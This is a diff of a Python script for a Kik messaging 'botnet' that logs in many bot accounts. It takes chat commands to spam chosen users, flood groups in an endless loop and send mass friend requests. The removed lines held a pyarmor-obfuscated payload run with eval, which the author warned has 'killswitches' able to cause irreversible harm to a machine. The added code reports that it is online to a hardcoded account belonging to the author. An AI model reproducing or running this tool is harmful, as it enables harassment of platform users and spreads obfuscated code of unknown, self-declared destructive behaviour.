@@ -1,36 +1,382 @@
 '''
-YOU MUST GET AN ACCESS KEY FOR YOUR BOTNET TO WORK. YOU CAN GET A FREE KEY FROM STETHO.
+
+You may notice there are a TON of #comments in here, this is to make it as easy as possible for you to understand how this code functions.
+Too many comments probably. But feedback on the beta was that there wasn't enough comments, and there were already a lot then, soooo...
+ANYWAYS, this code is FREE, so if someone sold this to you, I'm sorry to say that you got scammed. Poor you.
+There is a paid version of this that has more features like antipurge or add-all, but that's not this code.
+Nothing here was skidded, everything here was made by yours truly, aside from Tomer8007's api, obviously.
+You're welcome to modify this as much as you'd like! Have fun <3
+- Stetho
+
 '''
-print("\nWARNING: This code contains anti-tampering killswitches that can cause irreversable harm to a local machine if triggered, do NOT tamper with this bot's code!\n(For all disclaimers, visit pastebin.com/zRUVXuKL)\n")
-input("Press enter to acknowledge this warning and continue:")
-import base64
+
 import sys
-import subprocess
 import os
 import time
-from pytransform import pyarmor_runtime
-pyarmor_runtime()
-__pyarmor__(__name__, __file__, b'\x50\x59\x41\x52\x4d\x4f\x52\x00\x00\x03\x08\x00\x55\x0d\x0d\x0a\x07\x2c\xa0\x01\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00\xb1\x02\x00\x00\x00\x00\x00\x08\x2e\xe1\xd6\xd1\xe8\xf3\xbb\x5d\xb0\x3e\x58\x29\xf8\x1e\x37\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x93\x2e\x9a\x1b\x62\x3c\x70\x80\x78\x70\xa7\xce\xca\x4a\x60\xda\xce\xc6\x65\xdc\x69\x6e\x31\xe1\x49\x7c\xcc\xd1\x50\xae\xe8\xf1\x76\xce\xfa\x83\x4f\xdf\x13\xda\x11\xf5\xf5\xad\x10\xf5\xc2\x9f\x93\x23\x05\x5f\xbd\x2e\xc9\x9d\xc1\xd3\x24\x32\xa9\xae\x7e\xfe\x09\x46\x49\x94\xf9\x14\x85\x4c\x93\xeb\xd1\x3b\x41\x0b\x8f\x05\x7d\x24\x8c\x34\xbb\x5a\x19\xca\x61\xce\xb8\x2b\x09\x13\x65\x43\xe4\x64\xd4\x37\x04\x06\xa3\x83\xcb\xdf\xb7\x42\xd4\x0b\x03\xfc\xb4\xbc\x16\x57\xce\x2a\x84\x40\xcb\x84\x33\x00\xad\x3c\xcb\xd4\xc7\x27\x80\xdc\x48\x11\xcf\x4e\xeb\x4f\x97\x3b\x4e\x74\x4c\xc4\x6b\x20\x26\xb0\xed\x96\xd4\x51\x32\x86\xca\x67\x6c\x66\x28\x81\xfb\x41\x27\x1c\x8b\x92\x3f\xf4\xcd\x5b\x03\x69\x40\x93\x7f\x4a\x83\x21\x2d\x12\xec\x56\x0c\x4d\x9d\xaa\xeb\xd7\x65\x6b\x68\x4f\xed\xb8\xc0\xe9\x0a\xaf\x19\xc0\x67\x25\x37\x5e\xd9\xd2\xb0\x3a\xe8\x92\xc3\x35\x54\xcb\xf0\xd3\xc0\x3f\x9b\x73\x5e\xac\x2c\xde\x3a\x6b\x36\xe2\xf4\xe8\xff\x05\xb1\x2a\xd1\xc1\xce\x32\xa9\x56\x0b\xeb\x81\x07\x34\x04\x89\x6c\x75\x20\xb9\xcb\xbb\xac\x61\xb0\xb2\xf8\xe9\x37\x58\x7b\xac\xd5\xef\x20\x61\xcc\x6f\x27\xf7\xa2\x01\x4d\x9e\x44\x56\x0b\x08\x9b\x2e\x42\xc5\x5a\xe3\x2c\x66\xfb\x5a\x91\x0b\x3d\x33\xb8\xf2\xee\x0b\x27\x9e\x0e\x13\x95\xd9\x9b\xb4\x5c\x2c\x30\xf1\xb5\x35\xc2\x87\xb1\x2a\xa0\x68\xb8\x6f\x8a\xf3\xa4\x56\x4d\x71\x21\x6e\xc6\x2d\xbb\xeb\x65\x32\x34\x16\x1c\xb2\x6e\x83\x2c\xe7\xee\xed\xb4\x00\x59\x90\xac\x64\x50\x27\x84\x76\xc2\x81\xcc\x6d\xb1\x90\x59\x33\x81\x3b\xed\x7c\xaf\x78\xe0\x32\x39\x23\xcd\xf3\x97\xab\x3d\x9a\x8d\x85\x32\x79\x09\x5a\x2d\xc9\x7f\x6f\xb8\x02\x9b\x4f\x45\x00\xd7\x09\xa8\xb5\xec\xb8\x20\x17\xb8\xb8\xe8\x72\x31\x0b\x5d\x21\x52\xce\x91\x44\x59\x6e\xe8\xbf\x92\xc8\x6a\xd6\x01\x21\x84\xbe\x1c\xd3\xfd\xf9\x79\x7b\x38\x0e\x61\x43\x94\xe7\x82\xda\xc7\x2f\xd7\x4f\x68\x85\x22\x78\x4f\xc0\x06\x9f\xf8\x1b\x20\x9d\xba\x2d\xf1\xfe\xf3\xa4\x11\xcc\x93\x6a\xaf\x72\xa2\x76\x8b\x52\xc9\x4b\xa7\x4f\xfc\x83\xe3\x26\xc3\xce\x70\x23\x62\xf1\x63\x04\x52\x80\xec\xc3\x5d\xb7\xb7\x54\x7a\x16\xaf\x73\x7e\x14\x56\xcd\x0d\x20\x38\x19\x94\xbe\x99\x1b\xf8\x2d\xfc\xa2\xc0\xf5\xf8\x01\x55\x3d\xb5\x4c\xea\x45\x9f\x3a\xdd\xf2\x43\xb2\x7c\x14\x20\x11\xb2\x43\x8b\xa8\x1d\xbc\x2a\x96\x35\xbd\xf2\x98\x6a\x3c\x80\x7f\xd0\x87\x0c\xb4\x7f\x0f\x2c\x60\xda\x84\xe1\xbd\xb0\xfb\xa7\xfa\xd0\xc7\x2a\x04\x30\x41\xbe\xda\x26\xf7\xb3\x04\x4b\x3b\x52\x4c\x4d\x06\x21\x33\x68\x64\xb7\x95\x03\x34\x5c\xee\x28\x8e\x16\xb1\x8f\xb3\xce\xf2\x99\x75\xa6\x21\x7d\x1f\x10\xae\x8c\x8a\xac\x52\xdc\x7f\x05\x96\x78\x21\xbc\x03\x93\xac\xec\x51\xc7\xa9\xda\xc4\x8f\x34\x5b\x09\xf6\x3f\x1f\xca\xf1\x15\x63\xd6\x01\xf1\x4a\x88\x12\x9a\x3e\x9d\xdb\xe7\xc0\x40\x04\x8c\x49\xfa\x94\x6f\xb6\xdd\xc3\x6a\xe8\x4a\x94\xbf\xbc\x52\x26\x38\x0c\x2e\xc4\xfb\xd7\x3d\x86\x33\x00\xcc\x22\xb5\xd0\x86\xbd\x56', 2)
-try:
-  print("\nBooting up...\n")
-  run = base64.b64decode(skid)
-  eval(compile(run,'<string>','exec'))
-except ModuleNotFoundError:
-  print("Oh, it looks like some things need to be set up real quick! I'll take care of that for you.\n")
-  time.sleep(1)
-  print("Please wait...\n")
-  time.sleep(2)
-  os.system('git clone -b new https://github.com/StethoSaysHello/kik-bot-api-unofficial')
-  os.system('pip3 install ./kik-bot-api-unofficial')
-  def install(package):
-      subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-  install('emoji')
-  install('colorama')
-  install('pbwrap')
-  install('speedtest')
-  install('kik_unofficial')
-  print("\nI'm done installing everything you need, I'll start the botnet for you now.")
-  time.sleep(1)
-  print("Booting up...\n")
-  run = base64.b64decode(skid)
-  eval(compile(run,'<string>','exec'))
+import subprocess
+
+try: #This big ol' try/except is for running if modules are installed, and installing them if they are not. Check the except way at the bottom!
+    import emoji
+    import colorama
+    import kik_unofficial.datatypes.xmpp.chatting as chatting
+    from kik_unofficial.client import KikClient
+    from kik_unofficial.callbacks import KikClientCallback
+    from kik_unofficial.datatypes.xmpp.errors import LoginError
+    from kik_unofficial.datatypes.xmpp.roster import FetchRosterResponse
+    from kik_unofficial.datatypes.xmpp.login import LoginResponse, ConnectionFailedResponse
+
+    clear = open("kik-debug.log", "w+")  # This clears out debug logs if there are any.
+    clear.close()  # This closes the debug log, always a good practice.
+
+    class bcolors: #This is for adding colors to text in the terminal.
+        OKBLUE = '\033[94m' #This is blue
+        FAIL = '\033[91m' #This is red
+        ENDC = '\033[0m' #This is to stop using color.
+    global username_thing, spam, debug_jid, thing, attempt_number, given_pass #This declares these variables as global to be used everywhere because I'm lazy
+    attempt_number = 0 #This helps to check if it is the first set of logins or not for retrying closed connections.
+    print(bcolors.FAIL + ("(Paid users get access to premium commands! If you are a paid user, you're using the wrong script.)") + bcolors.ENDC)
+    print("This is a Kik botnet made by Stetho! For more information or to check for updates, visit https://github.com/StethoSaysHello/KikBotnet (This is v5.1)\nTo report bugs, reach out to StethoSpasm@gmail.com")
+    spam = "Qm90IG1hZGUgYnkgU3RldGhvU2F5c0hlbGxv" #This is just a random variable to be used later in the "spam" command.
+    debug_jid = "8675309debug_y8f@talk.kik.com" #This is where activity info is sent to. Has to be a JID, not a GJID.
+
+    def get_prefix(): #This function asks for the bot prefix.
+        username_thing = input(bcolors.OKBLUE + ("\nLet's get started.\nWhat is the prefix of your bots usernames?: ") + bcolors.ENDC) #This asks for the bot username prefix in the terminal.
+        return username_thing
+
+    username_thing = get_prefix() #This triggers the function that aske for the bot prefix
+
+    if len(username_thing) == 0: #This checks for blank prefixes, and retries get_prefix if there are any.
+        print(bcolors.FAIL + ("Uh-oh, it looks like you didn't provide any input! Let's try that again.") + bcolors.ENDC)
+        username_thing = get_prefix()
+    if " " in username_thing: #This checks for spaces in the prefix, and retries get_prefix if there are any.
+        print(bcolors.FAIL + ("Uh-oh! There is a space in the username prefix you provided. Let's try that again.") + bcolors.ENDC)
+        username_thing = get_prefix()
+
+    print(bcolors.OKBLUE + ("\nOkay, I will be signing into your botnet as \"" + username_thing + "1\", \"" + username_thing + "2\", and so on.\nIf this is incorrect, please restart this session.") + bcolors.ENDC) #This explains how the bots will sign in.
+
+
+    def get_bot_quantity(): #This function asks the user how many bots they wanna use.
+        try:
+            thing = int(input(bcolors.OKBLUE + ("\nHow many bots do you have?: ") + bcolors.ENDC))
+        except ValueError: #This is triggered when the input is not a number.
+            print(bcolors.FAIL + ("That's not a number, lol. Lets try that again.") + bcolors.ENDC)
+            thing = "NULL" #Just put a random string here to catch ValueError, could have put whatever.
+        return thing
+
+    thing = get_bot_quantity() #This triggers the above function to ask the user how many bots they wanna use,
+
+    if thing == "NULL": #This retries get_bot_quantity when the input is not a number.
+        thing = get_bot_quantity()
+    else: #Else statement used because im mixing str/int in 'thing'
+        if thing <= 0: #This retries get_bot_quantity when the input is equal to or lower than 0.
+            print(bcolors.FAIL + ("You must use a number greater than or equal to 1. Let's try that again.") + bcolors.ENDC)
+            thing = get_bot_quantity()
+
+    given_pass = input(bcolors.OKBLUE + ("\n" + str(thing) + " bots, got it! What is the password for your bots?: ") + bcolors.ENDC) #This asks for the bot's password, it doesn't need error handling.
+    print(bcolors.OKBLUE + ("\nThanks! Please stand by while I login to your bots, I'll let you know when I'm done.") + bcolors.ENDC)
+    time.sleep(1)
+    print(bcolors.FAIL + emoji.emojize(":warning: RED messages are important and require your attention, keep an eye out for them!") + bcolors.ENDC) #This is an example red text, ooooo
+    time.sleep(3)
+    print(bcolors.OKBLUE + emoji.emojize("Attempting to login to the botnet in ") + bcolors.ENDC)
+    print(bcolors.OKBLUE + emoji.emojize("3...") + bcolors.ENDC) #This is a countdown so the user has a few seconds to read the stuff above^
+    time.sleep(1)
+    print(bcolors.OKBLUE + emoji.emojize("2...") + bcolors.ENDC)
+    time.sleep(1)
+    print(bcolors.OKBLUE + emoji.emojize("1...") + bcolors.ENDC)
+    time.sleep(1)
+    def login(give_a_username, give_a_password, thing): #This is a function for logging in, it asks for user/pass and # of bots. Its a function so that it can be called on to retry later if there are any closed connections.
+        stetho_string = give_a_username #These arent really relevant but I didnt feel like changing variable names when I added retry on connection error, sooo....
+        given_pass = give_a_password
+        username = sys.argv[1] if len(sys.argv) > 1 else stetho_string #This is where the username goes
+        password = sys.argv[2] if len(sys.argv) > 2 else given_pass #This is where the password goes
+
+        def main(): #This function is used to execute the login process only if the file was run directly, and not imported.
+            SpamBotnet()
+
+        class SpamBotnet(KikClientCallback):
+            def __init__(self): #Constructor for the SpamBotnet class above
+                self.client = KikClient(self, username, password) #This is where the previously stored user/pass goes to login
+
+            def on_login_ended(self, response: LoginResponse): #This is triggered when the bot is done logging in
+                print(bcolors.OKBLUE + ("Logged in as {} {}, @{}".format(response.first_name, response.last_name, username)) + bcolors.ENDC) #This lets you know your bot logged in in the terminal. It says the first/last name and username.
+
+            def on_authenticated(self): #This is triggered when the bot is authenticated (yayyyy no closed connection)
+                self.client.request_roster() #This requests the roster, which is later used in on_roster_recieved
+
+            def on_chat_message_received(self, chat_message: chatting.IncomingChatMessage):
+                JID = chat_message.from_jid  #This grabs the sender's JID because I dont feel like typing that a million times
+                mssg = emoji.demojize(chat_message.body.lower()) #This grabs the message, encodes emojis, and makes it lowercase.
+                if mssg == "ping": #command to check if bot is online
+                    self.client.send_chat_message(JID, "pong") #Replies "pong". Pretty simple
+                elif mssg == "friend": #command to add the bot as a friend
+                    self.client.add_friend(JID) #This is a friend attribution request
+                    self.client.send_chat_message(JID, "You can now add me to groups.")
+                elif mssg == "commands": #command for listing the commands.
+                    self.client.send_chat_message(JID, "To spam a user's PMs, use \"spam [JID or Username] w/ [Message]\", this command works both in groups and PMs.\n\nTo spam a group, say \"friend\" in PMs to add me then add me to the group you wish to spam and say \"groupspam [message]\".\n\n Keep in mind that once you start spam, it will not stop until you restart the bot.")
+                elif mssg.startswith("spam"): #Command for spamming a user.
+                    if mssg == "spam": #Elaborates on how to use spam if the message is just "spam"
+                        self.client.send_chat_message(JID, "To use the spam tool, please use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                    else:
+                        if " w/ " in mssg: #This checks if "w/" was in the string and continues if so
+                            remove_spam = mssg.replace("spam ", "") #This takes the first part of the message off to isolate the jid/username and message
+                            split_string = remove_spam.split(" w/ ", 1) #This splits the message into the JID/username and message
+                            jid_to_spam = split_string[0] #This isolates the JID
+                            if jid_to_spam.startswith("@"): #This reminds the user they dont need an @ if they use one, and removes it for them.
+                                self.client.send_chat_message(JID, "Reminder: You do not need to put an \"@\" symbol before the username.")
+                                jid_to_spam = jid_to_spam.replace("@", "", 1)
+                                time.sleep(0.5) #Waits half a second
+                            message_to_spam = split_string[1] #Isolates the message we got in split_string
+                            if "groups" in jid_to_spam: #Checks if the JID they gave is actually a GJID and warns them if so.
+                                self.client.send_chat_message(JID, "You can't use a GJID for the spam command.")
+                            else: #Sends a confirmation of who is being spammed with what
+                                self.client.send_chat_message(JID, "I am spamming the user \"" + jid_to_spam + "\" with the message \"" + emoji.emojize(message_to_spam) + "\"!")
+                                print("I am spamming the user \"" + jid_to_spam + "\" with the message \"" + emoji.emojize(
+                                    message_to_spam) + "\"!")
+                                self.client.send_chat_message(jid_to_spam, emoji.emojize(message_to_spam)) #This is the bot spamming
+                                time.sleep(0.2) #< This is the delay between each message. You should leave it alone but if you need it to be faster/slower you can change it. NEVER set to 0, IP bans suck.
+                        else: #This lets the user know when they used the command wrong because "w/" isnt in the string
+                            self.client.send_chat_message(JID, "You need to put a \"w/\" with one space on both sides between the JID/username and the spam message.")
+                            time.sleep(0.5)
+                            self.client.send_chat_message(JID, "To use the spam tool, use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ i like dick.\"")
+                elif mssg.startswith("poke"):#Command for sending a single message to a user
+                    if mssg == "poke":
+                        self.client.send_chat_message(JID, "To use the poke tool, please use \"poke [JID or Username] w/ [Message]\".\n\nExample: \"poke bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                    else:
+                        if " w/ " in mssg:
+                            remove_poke = mssg.replace("poke ", "") #This takes the first part of the message off to isolate the jid/username and message
+                            split_string = remove_poke.split(" w/ ", 1) #This splits the message into the JID/username and message.
+                            jid_to_poke = split_string[0] #This isolates the JID.
+                            if jid_to_poke.startswith("@"): #This reminds the user they dont need an @ if they use one, and removes it for them.
+                                self.client.send_chat_message(JID, "Reminder: You do not need to put an \"@\" symbol before the username.")
+                                jid_to_poke = jid_to_poke.replace("@", "", 1)
+                            message_to_send = split_string[1] #Isolates the message we got in remove_poke
+                            if "groups" in jid_to_poke:#Checks if the JID they gave is actually a GJID and warns them if so.
+                                self.client.send_chat_message(JID, "You can't use a GJID for the poke command.")
+                            else: #Sends a confirmation of who is being sent what
+                                self.client.send_chat_message(JID, "I am poking the user \"" + jid_to_poke + "\" with the message \"" + emoji.emojize(message_to_send) + "\"!")
+                                print("I am poking the user \"" + jid_to_poke + "\" with the message \"" + emoji.emojize(message_to_send) + "\"!")
+                                self.client.send_chat_message(jid_to_poke, emoji.emojize(message_to_send))
+                        else: #This lets the user know when they used the command wrong because "w/" isn't in the string
+                            self.client.send_chat_message(JID, "You need to put a \"w/\" with one space on both sides between the JID/username and the message.\n\n(Error: w/ not found in message string.)")
+                            time.sleep(0.5)
+                            self.client.send_chat_message(JID, "To use the poke tool, use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                elif mssg.startswith("sendfriend"): #This is a command for sending a friend request to a JID
+                    self.client.send_chat_message(JID, "Tip: You should only use this in groups so that you can trigger all of your bots at once! That's kinda the point of this command...")
+                    if mssg == "sendfriend":
+                        self.client.send_chat_message(JID, "To use the sendfriend tool, please use \"sendfriend [JID or Username]\".\n\nExample: \"sendfriend stethosayshello_3pf@talk.kik.com\"") #This reminds the user that this command is best for groups
+                    else:
+                        remove_sendfriend = mssg.replace("sendfriend ", "", 1) #This removes the beginning of the message to isolate the JID
+                        self.client.send_chat_message(JID, "I am sending a friend attribution request and \"I'm adding you as a friend\" message to \"" + remove_sendfriend + " !")
+                        self.client.send_chat_message(remove_sendfriend, "I'm adding you as a friend!") #This lets the user know they are being added
+                        self.client.add_friend(remove_sendfriend) #This adds the user as a friend
+                elif mssg.startswith("leave"): #This command is for eaving groups with a GJID
+                    remove_leave = mssg.replace("leave ", "", 1) #This removes the first part of the message to isolate the GJID
+                    if mssg == "leave": #This checks if the message is just "leave" and gives instructions if so
+                        self.client.send_chat_message(JID, "To use the leave command, please use \"leave [GJID]\"")
+                    else:
+                        if "groups" in remove_leave: #This checks if the given GJID is in fact a GJID
+                            self.client.send_chat_message(JID, "Attempting to leave \"" + remove_leave + "\"!")
+                            self.client.leave_group(remove_leave) #This leaves the group
+                        else: #This tells the user that they used a JID or otherwise invalid input
+                            self.client.send_chat_message(JID, "You must use a valid GJID in the leave command! You used \"" + remove_leave + "\"!")
+
+            def on_group_message_received(self, chat_message: chatting.IncomingGroupChatMessage):
+                mssg = emoji.demojize(chat_message.body.lower())
+                GJID = chat_message.group_jid
+                #JID = chat_message.from_jid
+                if mssg.startswith("groupspam"): #This command spams a group with a message.
+                    if "groupspam " in mssg: #This elaborates on how to use groupspam if the user just says "groupspam"
+                        spam_message = mssg.replace("groupspam ", "", 1) #This isolates the message the user wants to send.
+                        while spam == "Qm90IG1hZGUgYnkgU3RldGhvU2F5c0hlbGxv":
+                            self.client.send_chat_message(GJID, emoji.emojize(spam_message)) #This sends the given message in a loop
+                            time.sleep(0.3) #This is the wait between each message. Never change it to 0, IP bans suck.
+                    else:
+                        self.client.send_chat_message(GJID, "Put a space in the command, or it wont work.")
+                elif mssg == "ping": #command to check if bot is online
+                    self.client.send_chat_message(GJID, "pong") #Replies "pong". Pretty simple
+                elif mssg == "friend": #This command lets the user know the friend command only works in PMs
+                    self.client.send_chat_message(GJID, "This can only be used in PMs")
+                elif mssg == "commands": #command for listing the commands.
+                    self.client.send_chat_message(GJID, "To spam a user's PMs, use \"spam [JID or Username] w/ [Message]\", this command works both in groups and PMs.\n\nTo spam a group, say \"friend\" in PMs to add me then add me to the group you wish to spam and say \"groupspam [message]\".\n\n Keep in mind that once you start spam, it will not stop until you restart the bot.")
+                elif mssg.startswith("spam"): #Command for spamming a user.
+                    if mssg == "spam": #Elaborates on how to use spam if the message is just "spam"
+                        self.client.send_chat_message(GJID, "To use the spam tool, please use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                    else:
+                        if " w/ " in mssg: #This checks if "w/" was in the string and continues if so
+                            remove_spam = mssg.replace("spam ", "") #This takes the first part of the message off to isolate the jid/username and message
+                            split_string = remove_spam.split(" w/ ", 1) #This splits the message into the JID/username and message
+                            jid_to_spam = split_string[0] #This isolates the JID
+                            if jid_to_spam.startswith("@"): #This reminds the user they dont need an @ if they use one, and removes it for them.
+                                self.client.send_chat_message(GJID, "Reminder: You do not need to put an \"@\" symbol before the username.")
+                                jid_to_spam = jid_to_spam.replace("@", "", 1)
+                                time.sleep(0.5) #Waits half a second
+                            message_to_spam = split_string[1] #Isolates the message we got in split_string
+                            if "groups" in jid_to_spam: #Checks if the JID they gave is actually a GJID and warns them if so.
+                                self.client.send_chat_message(GJID, "You can't use a GJID for the spam command.")
+                            else: #Sends a confirmation of who is being spammed with what
+                                self.client.send_chat_message(GJID, "I am spamming the user \"" + jid_to_spam + "\" with the message \"" + emoji.emojize(message_to_spam) + "\"!")
+                                print("I am spamming the user \"" + jid_to_spam + "\" with the message \"" + emoji.emojize(
+                                    message_to_spam) + "\"!")
+                                self.client.send_chat_message(jid_to_spam, emoji.emojize(message_to_spam)) #This is the bot spamming
+                                time.sleep(0.2) #< This is the delay between each message. You should leave it alone but if you need it to be faster/slower you can change it. NEVER set to 0, IP bans suck.
+                        else: #This lets the user know when they used the command wrong because "w/" isnt in the string
+                            self.client.send_chat_message(GJID, "You need to put a \"w/\" with one space on both sides between the JID/username and the spam message.")
+                            time.sleep(0.5)
+                            self.client.send_chat_message(GJID, "To use the spam tool, use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ i like dick.\"")
+                elif mssg.startswith("poke"):#Command for sending a single message to a user
+                    if mssg == "poke":
+                        self.client.send_chat_message(GJID, "To use the poke tool, please use \"poke [JID or Username] w/ [Message]\".\n\nExample: \"poke bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                    else:
+                        if " w/ " in mssg:
+                            remove_poke = mssg.replace("poke ", "") #This takes the first part of the message off to isolate the jid/username and message
+                            split_string = remove_poke.split(" w/ ", 1) #This splits the message into the JID/username and message.
+                            jid_to_poke = split_string[0] #This isolates the JID.
+                            if jid_to_poke.startswith("@"): #This reminds the user they dont need an @ if they use one, and removes it for them.
+                                self.client.send_chat_message(GJID, "Reminder: You do not need to put an \"@\" symbol before the username.")
+                                jid_to_poke = jid_to_poke.replace("@", "", 1)
+                            message_to_send = split_string[1] #Isolates the message we got in remove_poke
+                            if "groups" in jid_to_poke:#Checks if the JID they gave is actually a GJID and warns them if so.
+                                self.client.send_chat_message(GJID, "You can't use a GJID for the poke command.")
+                            else: #Sends a confirmation of who is being sent what
+                                self.client.send_chat_message(GJID, "I am poking the user \"" + jid_to_poke + "\" with the message \"" + emoji.emojize(message_to_send) + "\"!")
+                                print("I am poking the user \"" + jid_to_poke + "\" with the message \"" + emoji.emojize(message_to_send) + "\"!")
+                                self.client.send_chat_message(jid_to_poke, emoji.emojize(message_to_send))
+                        else: #This lets the user know when they used the command wrong because "w/" isn't in the string
+                            self.client.send_chat_message(GJID, "You need to put a \"w/\" with one space on both sides between the JID/username and the message.\n\n(Error: w/ not found in message string.)")
+                            time.sleep(0.5)
+                            self.client.send_chat_message(GJID, "To use the poke tool, use \"spam [JID or Username] w/ [Message]\".\n\nExample: \"spam bacon_6zl@talk.kik.com w/ Blue's a pretty color.\"")
+                elif mssg.startswith("sendfriend"): #This is a command for sending a friend request to a JID
+                    if mssg == "sendfriend":
+                        self.client.send_chat_message(GJID, "To use the sendfriend tool, please use \"sendfriend [JID or Username]\".\n\nExample: \"sendfriend stethosayshello_3pf@talk.kik.com\"") #This reminds the user that this command is best for groups
+                    else:
+                        remove_sendfriend = mssg.replace("sendfriend ", "", 1) #This removes the beginning of the message to isolate the JID
+                        self.client.send_chat_message(GJID, "I am sending a friend attribution request and \"I'm adding you as a friend\" message to \"" + remove_sendfriend + " !")
+                        self.client.send_chat_message(remove_sendfriend, "I'm adding you as a friend!") #This lets the user know they are being added
+                        self.client.add_friend(remove_sendfriend) #This adds the user as a friend
+                elif mssg.startswith("leave"): #This command is for eaving groups with a GJID
+                    remove_leave = mssg.replace("leave ", "", 1) #This removes the first part of the message to isolate the GJID
+                    if mssg == "leave": #This checks if the message is just "leave" and gives instructions if so
+                        self.client.send_chat_message(GJID, "To use the leave command, please use \"leave [GJID]\"")
+                    else:
+                        if "groups" in remove_leave: #This checks if the given GJID is in fact a GJID
+                            self.client.send_chat_message(GJID, "Attempting to leave \"" + remove_leave + "\"!")
+                            self.client.leave_group(remove_leave) #This leaves the group
+                        else: #This tells the user that they used a JID or otherwise invalid input
+                            self.client.send_chat_message(GJID, "You must use a valid GJID in the leave command! You used \"" + remove_leave + "\"!")
+
+            def on_roster_received(self, response: FetchRosterResponse): #This function is triggered when the roster is recieved.
+                #You can add an option to view the rosters here, but it was removed to avoid spam in the terminal. Just unquote it if you want to use it.
+                #print("Roster:\n" + '\n'.join([str(member) for member in response.peers]))
+                response: chatting.IncomingChatMessage
+                self.client.send_chat_message(debug_jid, emoji.emojize(":warning: I'm online!"))
+
+            def on_connection_failed(self, response: ConnectionFailedResponse): #This function is triggered when your kik bot's connection is closed/fails
+                print(bcolors.OKBLUE + emoji.emojize("Kik closed the connection for " + username_thing + str(thing) + ".") + bcolors.ENDC) #This lets the user know the connection was closed
+                oof = open("loginerror.txt", "a+") #This opens the loginerror.txt file
+                oof.write(username_thing + str(thing) + "\n") #This writes the username of the bot into the loginerror.txt file for the login retry later
+                oof.close() #This closes the text file. Always a good practice
+
+            def on_login_error(self, login_error: LoginError): #This function is triggered when there is a login error.
+                if login_error.is_captcha(): #This is triggered when the error is a captcha. Would have added the captcha wizard, but thats not very useful in a botnet.
+                    print(bcolors.FAIL + emoji.emojize(":warning: Oh no! It looks like @" + username_thing + str(thing) + " has a captcha, I can't login! Please sign into it manually on your own device to clear the captcha.") + bcolors.ENDC) #This warns the user of the captcha.
+                else: #Any other issues are username/password mismatches, so this is triggered when the error is not a captcha.
+                    print(bcolors.FAIL + emoji.emojize(":warning: Your username or password for " + username_thing + str(thing) + " is incorrect!") + bcolors.ENDC) #This warns the user the username/password is incorrect.
+
+        if __name__ == '__main__': #This is used to execute the login process only if the file was run directly, and not imported.
+            main()
+
+    clear = open("loginerror.txt", "w+") #This clears out loginerror.txt
+    clear.close()
+    if attempt_number == 0: #This checks if logins have been attempted yet, and starts the first login attempts if not.
+        while int(thing) > 0: #This loops through the number of bots
+            for i in range(thing):
+                stetho_string = username_thing + str(thing) #This gets the username to login as
+                login(stetho_string, given_pass, thing) #This attempts the login
+                time.sleep(5) #This waits 5 seconds between each login to avoid closed connections
+                thing = int(thing) - 1 #This decreases the bot count by one after the login attempt
+        attempt_number = attempt_number + 1 #This increases the attempt number so that this chunk is not triggered again
+
+
+    def retry_login(password): #This function retries logns when there are closed connections
+        errors = open("loginerror.txt", "r") #This opens loginerror.txt to read it
+        number_of_errors = 0 #This sets the number of errors to 0 for the next step
+        read_errors = errors.read() #This reads loginerror.txt
+        errors_list = read_errors.split("\n") #This makes a list out of the contents of loginerror.txt
+        for user in errors_list: #This loops through each user in the errors list
+            if user: #This counts the number of users in the error list
+                number_of_errors += 1
+        if " " in errors_list: #This ignores any blank lines, happens sometimes.
+            number_of_errors = number_of_errors - 1
+        if number_of_errors > 0: #This checks if there are any errors, if so, attempts to log in.
+            print(bcolors.OKBLUE + emoji.emojize(":warning: There is " + str(number_of_errors) + " closed connection(s). I'll attempt to sign into the account(s) again!") + bcolors.ENDC) #This lets the user know that the script will retry the login(s)
+            print(bcolors.OKBLUE + emoji.emojize("Re-attempting login(s)...") + bcolors.ENDC)
+            time.sleep(1) #This waits a second so the user can read
+            clear = open("loginretry.txt", "w+") #This clears the text from loginretry.txt
+            clear.close() #This closes the file, always a good practice.
+            oof = open("loginretry.txt", "a+") #This opens loginretry.txt to append to it
+            for user in errors_list: #This loops through each user in errors list and adds them to loginretry.txt
+                oof.write(user + "\n")
+            oof.close() #This closes the file, always a good practice.
+            retry = open("loginretry.txt", "r") #This opens loginretry.txt to read it
+            read_retry = retry.read() #This reads loginretry.txt
+            retry_list = read_retry.split("\n") #This splits loginretry.txt into a list
+            clear = open("loginerror.txt", "w+") #Clears the text from loginerror.txt
+            clear.close() #This closes the file, always a good practice.
+            for name in retry_list: #This loops through the failed logins
+                if number_of_errors > 0: #This checks if there are errors remaining before continuing
+                    if " " in name: #This makes lines with spaces blank
+                        checked_name = name.replace(" ", "")
+                    else:
+                        checked_name = name
+                    if not not checked_name: #This ignores blank lines
+                        login(checked_name, password, number_of_errors) #This attempts to login
+                    time.sleep(5) #This waits 5 seconds between each login to avoid closed connections
+                    number_of_errors = number_of_errors - 1 #This subtracts 1 from the error count
+            retry.close() #This closes the file, always a good practice.
+
+
+    errors = open("loginerror.txt", "r") #This opens loginerror.txt to read it
+    number_of_errors = 0 #This sets the number of errors to 0 to later count the errors
+    read_errors = errors.read() #This reads loginerror.txt
+    errors_list = read_errors.split("\n") #This splits the contents of loginerror.txt into a list
+
+    for user in errors_list: #Loops through each user in the list we made above
+        if user: #This counts the number of errors
+            number_of_errors += 1
+    if " " in errors_list: #This ignores blank lines, happens from time to time.
+        number_of_errors = number_of_errors - 1
+
+    number_of_attempts = 20 #This specifies the number of times the bot will retry logins when connections are closed. I recommend you leave it alone.
+    while number_of_attempts > 0: #This checks if it is the first login attempt or not. If not, continues.
+        if number_of_errors > 0: #This checks if there are any errors left. If there are errors, it continues.
+            retry_login(given_pass) #This attempts login again
+        number_of_attempts = number_of_attempts - 1 #This subtracts 1 from the number of attemots so that it only retries a specified number of times.
+
+    time.sleep(1) #Slight delay so stuff doesnt spam
